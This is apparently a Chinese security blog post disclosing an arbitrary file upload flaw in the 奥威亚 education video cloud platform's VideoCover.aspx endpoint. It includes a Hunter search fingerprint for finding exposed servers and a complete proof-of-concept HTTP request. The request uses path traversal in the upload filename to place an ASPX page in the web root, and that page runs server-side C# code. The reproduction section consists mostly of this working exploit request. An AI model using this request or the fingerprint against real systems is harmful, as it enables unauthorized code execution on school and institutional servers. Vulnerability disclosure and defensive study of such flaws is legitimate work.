#  奥威亚教育视频云平台VideoCover存在任意文件上传漏洞   
原创 骇客安全  骇客安全   2025-01-22 16:01  
  
**一、漏洞简介**  
  
奥威亚教育视频云平台是  
一种教育技术解决方案，致力于提供高质量的在线教育视频服务。该平台为教育机构和教师提供了一个全面的视频管理和交流平台。奥威亚教育视频云平台VideoCover存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。  
**二、影响版本**  
  
奥威亚教育视频云平台  
**三、资产测绘**  
  
hunter  
  
web.body="/CSS/NewtonTheme/assets/app.css"  
  
特征  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/IePibcXn991OZlBNZAUeDWz8BhKeUsibldcBpKaiaSIyVRoBtOwkmkCHncuWVicIbR3c3L14MiaJkicxnrqmv6yOum0g/640?wx_fmt=other&from=appmsg "")  
  
**四、漏洞复现**  
```
POST/Tools/Video/VideoCover.aspx HTTP/1.1
User-Agent: Mozilla/5.0(Macintosh;IntelMacOSX10.15;rv:120.0)Gecko/20100101Firefox/120.0
Content-Type: multipart/form-data;boundary=00content0boundary00
Host: xx.xx.xx.xx
Accept: text/html,image/gif,image/jpeg,*;q=.2,*/*;q=.2
Content-Length: 301
Connection: close

--00content0boundary00
Content-Disposition: form-data;name="file";filename="/../../../AVA.ResourcesPlatform.WebUI/stc.aspx"
Content-Type: image/png

<%@ PageLanguage="C#"%>
<%Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
--00content0boundary00--
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/IePibcXn991OZlBNZAUeDWz8BhKeUsibldK080LupnNtOWNJN3JYYsjcZMenjuJx34IMqkaAYmhjVjPV1iarJIt1A/640?wx_fmt=other&from=appmsg "")  
  
  
上传文件位置  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/IePibcXn991OZlBNZAUeDWz8BhKeUsibldF9EQuyaUrr6NtxsyfqibZ0sSePa0BgEIqdUuuLI1OzWrL81KTib1ZScw/640?wx_fmt=other&from=appmsg "")  
  
  
  
